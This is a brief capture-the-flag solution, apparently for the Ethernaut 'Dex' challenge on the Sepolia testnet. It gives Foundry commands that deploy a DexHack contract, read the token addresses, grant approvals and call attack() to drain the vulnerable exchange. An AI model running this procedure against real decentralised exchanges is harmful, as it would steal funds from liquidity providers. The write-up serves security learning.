# Dex Solution

1) Deploy `DexHack`:

```
forge create DexHack --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey --constructor-args `ìnstanceAddress`
```

2) Retrieve the `token1Address` and the `token2Address`:

```
cast call `ìnstanceAddress` "token1()" --rpc-url $SEPOLIA_RPC_URL
# truncate the first 24 zeros from `token1Address`
cast call `ìnstanceAddress` "token2()" --rpc-url $SEPOLIA_RPC_URL
# truncate the first 24 zeros from `token2Address`
```

3) Call `approve()`:

```
cast send `token1Address` "approve(address,uint256)" `dexHackAddress` 100 --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
cast send `token2Address` "approve(address,uint256)" `dexHackAddress` 100 --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```

4) Call `attack()`:

```
cast send `dexHackAddress` "attack()" --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
